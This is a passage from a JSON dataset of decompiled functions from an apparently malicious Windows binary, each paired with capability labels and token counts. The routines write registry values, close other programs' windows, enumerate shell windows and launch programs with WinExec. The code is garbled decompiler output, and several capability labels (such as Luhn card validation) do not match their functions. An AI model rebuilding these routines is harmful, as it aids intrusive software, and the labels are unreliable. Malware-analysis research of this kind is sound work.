- 0x222c < 0;\n    fVar13 = fcn.00404b30(0x411030, 0xd, 0x41146c, 8);\n    if ((!bVar11) && (bVar11)) {\n        *(unaff_EDI + 0x1d) = fVar13;\n        uVar8 = unaff_ESI + 4;\n    }\n    uVar12 = fcn.00404b30(0x411030, 0xd, 0x411474, 6);\n    uVar9 = 0;\n    uVar8 = uVar8 & (uVar12 & 0xffff0000 | CONCAT11((uVar12 >> 8) + '\\x01', uVar12));\n    uVar10 = uVar8 == 0;\n    bVar11 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    fcn.00404b30(0x411030, 0xd, 0x41147c, 7);\n    if (bVar11) goto code_r0x0040311e;\n    while( true ) {\n        if (bVar11) {\n            puVar7 = &stack0xffffffe0;\n            cVar4 = '\\x1e';\n            do {\n                puVar6 = puVar6 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar6;\n                cVar4 = cVar4 + -1;\n            } while ('\\0' < cVar4);\n            uVar15 = in(0x78);\n            return uVar15;\n        }\ncode_r0x0040311e:\n        puVar3 = fcn.00404b30(0x411030, 0xd, 0x411484, 7);\n        if ((uVar9) || (!uVar9)) break;\n        bVar11 = &stack0xffffffd4 < *puVar3;\n        if (bVar11 || puVar3 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = extraout_CL_00 - *(unaff_EBX + 0x66f68bdb);\n        uVar9 = extraout_CL_00 < *(unaff_EBX + 0x66f68bdb) || uVar1 < bVar11;\n        cVar4 = uVar1 - bVar11;\n        uVar10 = cVar4 == '\\0';\n        bVar11 = (POPCOUNT(cVar4) & 1U) == 0;\n    }\n    puStack64 = 0x403169;\n    fcn.00404b30(0x411030, 0xd, 0x41148c, 6);\n    puVar7 = puVar6;\n    if ((!uVar10) && (uVar10)) {\n        puStack132 = &stack0xffffffc0;\n        puVar5 = &stack0xffffffc0;\n        puVar7 = &stack0xffffffc0;\n        cVar4 = '\\x10';\n        puVar2 = puVar6;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar2;\n            cVar4 = cVar4 + -1;\n            puStack64 = puVar6;\n        } while ('\\0' < cVar4);\n    }\n    fcn.00404b30(0x411030, 0xd, 0x411494, 0x25);\n    bVar11 = (POPCOUNT(&stack0xffffa191 & 0xff) & 1U) != 0;\n    if ((bVar11) && (!bVar11)) {\n        puVar6 = &stack0xffffa18d;\n        cVar4 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar7;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n        uVar15 = in(0x78);\n        return uVar15;\n    }\n    uVar15 = fcn.00404b30(0x411030, 0xd, 0x4114bc, 8);\n    return uVar15;\n}\n",
        "token_count": 1880
    },
    "00403960": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403960(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405220;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41142c);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411438);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x41144c);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00403d76:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00403d82:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00403d3d:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00403d82;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403b79:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403770(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411460);\n                        if (iVar1 != 0) goto joined_r0x00403b79;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00403d22:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00403d76;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00403d22;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00403770(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.004038a0(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00403d3d;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2453
    },
    "00403ea0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f61) overlaps instruction at (ram,0x00403f60)\n// \n// WARNING: Removing unreachable block (ram,0x00403f5e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403ea0(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = false;\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = arg_8h;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar3) && (bVar3)) {\n        *puVar2 = unaff_EBX;\n        return unaff_EBX;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x411408);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403e20, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 502
    },
    "00404220": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040423d) overlaps instruction at (ram,0x0040423c)\n// \n\nbool fcn.00404220(void)\n\n{\n    char cVar1;\n    ushort extraout_var;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t *unaff_EBX;\n    char *pcVar4;\n    bool bVar5;\n    bool in_SF;\n    ulong uVar6;\n    ushort uVar7;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((!in_SF) && (in_SF)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar6 = fcn.004015d0(&var_4h);\n    if (uVar6 == 0) {\n        return false;\n    }\n    bVar5 = var_4h == NULL;\n    if (bVar5) {\n        return false;\n    }\n    pcVar3 = var_4h;\n    uVar7 = extraout_var;\n    if ((!bVar5) && (bVar5)) {\n        uVar7 = 0x47;\n        pcVar3 = uVar6 >> 0x20;\n    }\n    iVar2 = -1;\n    pcVar4 = pcVar3;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41120c, 0x41124c, 1, pcVar3, ~iVar2 - 1, uVar7);\n    return iVar2 == 0;\n}\n",
        "token_count": 442
    },
    "004042b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004043cb) overlaps instruction at (ram,0x004043c7)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040435f)\n// WARNING: Removing unreachable block (ram,0x0040432c)\n// WARNING: Removing unreachable block (ram,0x004043cf)\n// WARNING: Removing unreachable block (ram,0x004043eb)\n\nvoid __cdecl fcn.004042b0(uint8_t **arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    uint *puVar5;\n    char cVar6;\n    uint16_t uVar7;\n    uint32_t in_ECX;\n    uint8_t uVar9;\n    int32_t in_EDX;\n    uint8_t *puVar8;\n    int32_t unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint8_t **ppuVar12;\n    uint8_t **ppuVar13;\n    bool bVar14;\n    uint uStack32;\n    uint16_t uStack26;\n    uint16_t uStack24;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar7 = in_ECX;\n    uStack18 = uVar7;\n    uStack20 = unaff_EBX >> 0x10;\n    uStack24 = unaff_ESI >> 0x10;\n    *arg_8h = 0xc1;\n    if (((unaff_ESI | 0x561b) <= in_EDX) || (in_EDX < (unaff_ESI | 0x561b))) {\n        *(arg_8h + 1) = 0xbc;\n        uStack18 = in_ECX >> 0x10;\n        uStack24 = in_EDX;\n        in_ECX = in_ECX & 0xffff0000 | uVar7 & unaff_ESI;\n        uStack20 = uVar7;\n    }\n    uVar7 = uStack18;\n    piVar1 = in_ECX + 0xce236652 + in_EDX * 2;\n    *piVar1 = *piVar1 + arg_8h;\n    uVar9 = unaff_EBX >> 8;\n    bVar14 = -1 < (in_EDX ^ uVar9 | 0x67);\n    *(arg_8h + 2) = 0x24;\n    ppuVar12 = arg_8h;\n    if ((bVar14) && (uStack18 = uStack24,  !bVar14)) {\n        out(0xc4, in_EAX);\n        uStack24 = uStack24 & 0xff00;\n        ppuVar12 = arg_8h + 1;\n        *arg_8h = in_EAX;\n    }\n    *(ppuVar12 + 3) = 0xd3;\n    uVar3 = in_EAX;\n    bVar14 = uVar3 == 1;\n    *(ppuVar12 + 1) = 0x42;\n    ppuVar13 = ppuVar12;\n    if (('\\0' < uVar3) && (uVar3 < '\\x01')) {\n        out(0xc4, in_EAX);\n        uStack24 = uStack24 & 0xff00;\n        ppuVar13 = ppuVar12 + 1;\n        *ppuVar12 = in_EAX;\n        bVar14 = uVar9 == *in_EAX;\n    }\n    *(ppuVar13 + 5) = 0xf0;\n    puVar11 = &stack0xfffffffc;\n    if ((!bVar14) && (puVar11 = &stack0xfffffffc,  bVar14)) {\n        puVar10 = &stack0xffffffe4;\n        puVar11 = &stack0xffffffe4;\n        cVar2 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar5;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    *(ppuVar13 + 6) = 0xa6;\n    *(ppuVar13 + 7) = 0x37;\n    *(ppuVar13 + 2) = 0x9d;\n    uVar9 = uStack24 >> 8 & 0x12;\n    bVar14 = (uStack24 & 0x1200) == 0;\n    puVar8 = *(puVar11 + 8);\n    puVar8[9] = 0x8e;\n    puVar8[10] = 0xfd;\n    puVar8[0xb] = 0xdb;\n    if ((bVar14) || (!bVar14)) {\n        puVar8[0xc] = 0xf3;\n    }\n    else {\n        uVar9 = uVar3 | 0xf3;\n        in_EAX = in_EAX | 0xf3;\n    }\n    bVar14 = (POPCOUNT(uVar9) & 1U) == 0;\n    if ((bVar14) || (!bVar14)) {\n        puVar8[0xd] = 3;\n        uStack26 = in_EAX;\n    }\n    else {\n        puVar4 = puVar8 + 1;\n        puVar11 = *0xc617b43a;\n        puVar8 = in_EAX + 1;\n        in_EAX = puVar4 | 0x66506603;\n        uStack26 = uVar7;\n    }\n    cVar2 = uStack20;\n    cVar6 = cVar2 + -1;\n    bVar14 = (POPCOUNT(cVar6) & 1U) == 0;\n    puVar8[0xe] = 0x74;\n    if ((cVar6 != '\\0' && '\\0' < cVar2) && (cVar6 == '\\0' || cVar2 < '\\x01')) {\n        if (CONCAT22(uVar7, uStack20) == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar5 = in_EAX & 0xffff0000 | uStack26;\n    puVar8[0xf] = 0x2f;\n    if ((bVar14) || (!bVar14)) {\n        puVar5 = *(puVar11 + 0xc);\n        unaff_EBX = unaff_EDI;\n    }\n    *(unaff_EBX + 0x5e5f0c45) = *(unaff_EBX + 0x5e5f0c45) | 0x5b;\n    *puVar5 = 0x10;\n    return;\n}\n",
        "token_count": 1611
    },
    "00404470": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404470(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004042b0(&var_68h, &var_4h);\n    fcn.00401fe0(&var_68h, var_4h, 0x4114c4, 0x10000);\n    *arg_8h = 0x4114c4;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 243
    },
    "00404940": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004049f8) overlaps instruction at (ram,0x004049f7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00404940(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    ulong uVar9;\n    uint in_stack_fffffeb0;\n    int32_t in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    int32_t arg_18h_00;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004035a0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    cVar8 = '\\0';\n    cVar7 = (arg_20h & (uVar1 & 0xffff0000 | CONCAT11((uVar1 >> 8) + '\\x01', uVar1))) < 0;\n    fcn.004035a0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    uVar9 = fcn.004035a0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    iVar3 = uVar9;\n    if ((cVar8 != cVar7) || (iVar4 = extraout_ECX,  arg_18h_00 = arg_18h,  cVar8 == cVar7)) {\n        iVar3 = arg_20h + 0xe0;\n        in_stack_fffffeb8 = 0x20;\n        iVar4 = arg_14h;\n        in_stack_fffffeb0 = arg_1ch;\n        in_stack_fffffeb4 = arg_14h;\n        arg_18h_00 = iVar3;\n    }\n    cVar7 = uVar9 >> 0x28;\n    pcVar2 = uVar9 >> 0x20 & 0xffff0000 | CONCAT11(uVar9 >> 0x20, cVar7);\n    *pcVar2 = *pcVar2 + cVar7;\n    pcVar2[0x6a] = pcVar2[0x6a] + iVar3;\n    *(iVar4 + 0x57) = *(iVar4 + 0x57) & iVar3;\n    fcn.004035a0(arg_18h, in_stack_fffffeb0, in_stack_fffffeb4, in_stack_fffffeb8, arg_18h_00);\n    bVar6 = (POPCOUNT(&stack0xfffffee8 & 0xff) & 1U) != 0;\n    if ((bVar6) && (!bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = func_0x004048f0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar3;\n    }\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar3 = fcn.00404f30(0x80000001, 0x41128c, 0x4112b8, &var_8h, &var_10ch, &var_4h);\n    if ((iVar3 != 0) && (iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x411308),  iVar3 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 1084
    },
    "00404c70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404e7f) overlaps instruction at (ram,0x00404e7c)\n// \n// WARNING: Removing unreachable block (ram,0x00404e73)\n// WARNING: Removing unreachable block (ram,0x00404e81)\n// WARNING: Removing unreachable block (ram,0x00404dab)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404c70(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t extraout_ECX;\n    uint *puVar5;\n    char *extraout_ECX_00;\n    uint32_t *puVar6;\n    uint8_t uVar7;\n    uint8_t in_AF;\n    uchar uVar8;\n    char cVar9;\n    char cVar10;\n    unkbyte10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 extraout_ST0_01;\n    float10 fVar11;\n    ulong uVar12;\n    uchar uVar13;\n    ushort uVar14;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar5 = &var_213h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    s = 0;\n    puVar5 = &var_10fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    uVar8 = 1;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 100, 0xe8, arg_8h);\n    if ((uVar8) || (puVar5 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff,  !uVar8)) {\n        puVar5 = &var_8h;\n    }\n    fcn.004012c0(&var_4h, puVar5);\n    iVar4 = fcn.004023c0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar4 = fcn.00403470(&s, var_4h, var_8h);\n    uVar7 = 0;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    cVar10 = SBORROW1(iVar4, '\\x01');\n    cVar9 = iVar4 + -1 < '\\0';\n    uVar12 = fcn.00404220();\n    puVar6 = uVar12 >> 0x20;\n    uVar8 = arg_ch;\n    uVar13 = arg_ch >> 8;\n    uVar14 = arg_ch >> 0x10;\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        *(uVar12 + -0x7ce92414) = extraout_ST0;\n        uVar2 = uVar12 - 1;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + in_AF * '\\x06';\n        uVar1 = *puVar6;\n        *puVar6 = *puVar6 + 0x9c68df84;\n        *extraout_ECX_00 =\n             *extraout_ECX_00 + uVar2 + (0x90 < (uVar2 & 0xf0) | uVar7 | in_AF * (0xf9 < uVar2)) * '`' +\n             (0x6397207b < uVar1);\n    }\n    else {\n        uVar8 = 0x9c;\n        uVar13 = 0x10;\n        uVar14 = 0x41;\n    }\n    iVar4 = fcn.00401820(CONCAT22(uVar14, CONCAT11(uVar13, uVar8)));\n    if (iVar4 == -1) {\n        iVar3 = fcn.00401820(0x411090);\n        iVar4 = iVar3 + 1;\n        fVar11 = extraout_ST0_00;\n        if (iVar3 == -1) goto code_r0x00404e40;\n        uVar8 = 0xf;\n    }\n    else {\n        uVar8 = 0xe;\n    }\n    iVar4 = fcn.00401a00(arg_8h);\n    if (iVar4 != 0) {\n        fcn.00401ae0(uVar8);\n        fcn.00404f20(uVar8);\n        return 1;\n    }\n    fVar11 = extraout_ST0_01;\n    iVar4 = *0x4214e4;\n    if (*0x4214e4 == 0) {\n        return 0;\n    }\ncode_r0x00404e40:\n    if ((-1 < iVar4) && (-1 >= iVar4)) {\n        *(arg_8h + 0x1c) = fVar11;\n        arg_8h = arg_8h + 5;\n    }\n    iVar4 = fcn.00401540(arg_8h, &s);\n    if (iVar4 == 0) {\n        var_ch = 0;\n    }\n    if ((var_ch != 0) && (iVar4 = fcn.004031d0(),  iVar4 == 0)) {\n        var_ch = 0;\n    }\n    if (var_ch == 0) {\n        var_ch = fcn.00402230(arg_8h, 0);\n    }\n    if (var_ch != 0) {\n        fcn.00404f20();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0xb0, 0);\n    return var_ch;\n}\n",
        "token_count": 1511
    },
    "00404f30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404fc8) overlaps instruction at (ram,0x00404fc6)\n// \n// WARNING: Removing unreachable block (ram,0x00404fc5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00404f30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 239
    },
    "00401770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
